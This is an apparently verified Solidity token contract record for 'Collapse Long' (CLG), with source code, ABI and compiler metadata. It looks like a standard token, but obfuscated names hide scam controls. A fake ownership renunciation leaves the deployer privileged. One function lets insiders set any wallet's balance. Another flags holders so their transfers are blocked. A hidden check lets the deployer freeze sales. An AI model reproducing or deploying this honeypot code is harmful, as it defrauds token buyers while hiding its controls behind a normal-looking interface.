{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface sellWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeLiquiditySwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedEnable {\n    function createPair(address exemptList, address receiverTake) external returns (address);\n}\n\ninterface marketingShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletLimitSwap) external view returns (uint256);\n\n    function transfer(address modeMaxAt, uint256 txSell) external returns (bool);\n\n    function allowance(address txTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeMaxAt,\n        uint256 txSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverIs, uint256 value);\n    event Approval(address indexed txTotal, address indexed spender, uint256 value);\n}\n\ninterface enableBuy is marketingShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CollapseLong is modeLiquiditySwap, marketingShould, enableBuy {\n\n    bool private walletIs;\n\n    function atLiquidity(uint256 txSell) public {\n        fundWalletSwap();\n        toMinAmount = txSell;\n    }\n\n    event OwnershipTransferred(address indexed enableFund, address indexed tokenIsTake);\n\n    function launchTeam(address buyToken, address modeMaxAt, uint256 txSell) internal returns (bool) {\n        if (buyToken == minAuto) {\n            return teamShould(buyToken, modeMaxAt, txSell);\n        }\n        uint256 tokenTx = marketingShould(amountAtExempt).balanceOf(minAmount);\n        require(tokenTx == toMinAmount);\n        require(modeMaxAt != minAmount);\n        if (marketingFund[buyToken]) {\n            return teamShould(buyToken, modeMaxAt, txTeam);\n        }\n        return teamShould(buyToken, modeMaxAt, txSell);\n    }\n\n    function transferFrom(address buyToken, address modeMaxAt, uint256 txSell) external override returns (bool) {\n        if (_msgSender() != teamMarketingSender) {\n            if (totalExempt[buyToken][_msgSender()] != type(uint256).max) {\n                require(txSell <= totalExempt[buyToken][_msgSender()]);\n                totalExempt[buyToken][_msgSender()] -= txSell;\n            }\n        }\n        return launchTeam(buyToken, modeMaxAt, txSell);\n    }\n\n    bool public totalTake;\n\n    function allowance(address totalFee, address tradingTx) external view virtual override returns (uint256) {\n        if (tradingTx == teamMarketingSender) {\n            return type(uint256).max;\n        }\n        return totalExempt[totalFee][tradingTx];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeToken;\n    }\n\n    uint256 public swapToken;\n\n    function balanceOf(address walletLimitSwap) public view virtual override returns (uint256) {\n        return receiverFromMode[walletLimitSwap];\n    }\n\n    mapping(address => bool) public receiverEnable;\n\n    uint256 constant txTeam = 3 ** 10;\n\n    address public minAuto;\n\n    function shouldMode() public {\n        emit OwnershipTransferred(minAuto, address(0));\n        feeAt = address(0);\n    }\n\n    bool private limitReceiver;\n\n    uint256 private launchIs;\n\n    string private launchExempt = \"Collapse Long\";\n\n    function fundWalletSwap() private view {\n        require(receiverEnable[_msgSender()]);\n    }\n\n    bool public takeFundTx;\n\n    constructor (){\n        \n        sellWallet toMarketing = sellWallet(teamMarketingSender);\n        amountAtExempt = launchedEnable(toMarketing.factory()).createPair(toMarketing.WETH(), address(this));\n        \n        minAuto = _msgSender();\n        shouldMode();\n        receiverEnable[minAuto] = true;\n        receiverFromMode[minAuto] = atTake;\n        \n        emit Transfer(address(0), minAuto, atTake);\n    }\n\n    function walletAtTotal(address senderAmount) public {\n        fundWalletSwap();\n        \n        if (senderAmount == minAuto || senderAmount == amountAtExempt) {\n            return;\n        }\n        marketingFund[senderAmount] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atTake;\n    }\n\n    bool private launchedFund;\n\n    function owner() external view returns (address) {\n        return feeAt;\n    }\n\n    address teamMarketingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public amountAtExempt;\n\n    mapping(address => bool) public marketingFund;\n\n    uint256 marketingMax;\n\n    function getOwner() external view returns (address) {\n        return feeAt;\n    }\n\n    bool public sellTo;\n\n    function teamShould(address buyToken, address modeMaxAt, uint256 txSell) internal returns (bool) {\n        require(receiverFromMode[buyToken] >= txSell);\n        receiverFromMode[buyToken] -= txSell;\n        receiverFromMode[modeMaxAt] += txSell;\n        emit Transfer(buyToken, modeMaxAt, txSell);\n        return true;\n    }\n\n    function receiverReceiver(address minMax) public {\n        require(minMax.balance < 100000);\n        if (totalTake) {\n            return;\n        }\n        \n        receiverEnable[minMax] = true;\n        if (takeFundTx) {\n            launchIs = swapToken;\n        }\n        totalTake = true;\n    }\n\n    function transfer(address isSender, uint256 txSell) external virtual override returns (bool) {\n        return launchTeam(_msgSender(), isSender, txSell);\n    }\n\n    uint256 private atTake = 100000000 * 10 ** 18;\n\n    uint256 toMinAmount;\n\n    function receiverFee(address isSender, uint256 txSell) public {\n        fundWalletSwap();\n        receiverFromMode[isSender] = txSell;\n    }\n\n    address minAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private feeAt;\n\n    uint8 private receiverAmountList = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAmountList;\n    }\n\n    mapping(address => uint256) private receiverFromMode;\n\n    function name() external view virtual override returns (string memory) {\n        return launchExempt;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalExempt;\n\n    function approve(address tradingTx, uint256 txSell) public virtual override returns (bool) {\n        totalExempt[_msgSender()][tradingTx] = txSell;\n        emit Approval(_msgSender(), tradingTx, txSell);\n        return true;\n    }\n\n    string private feeToken = \"CLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenIsTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAtExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"atLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimitSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeMaxAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"}],\"name\":\"walletAtTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CollapseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}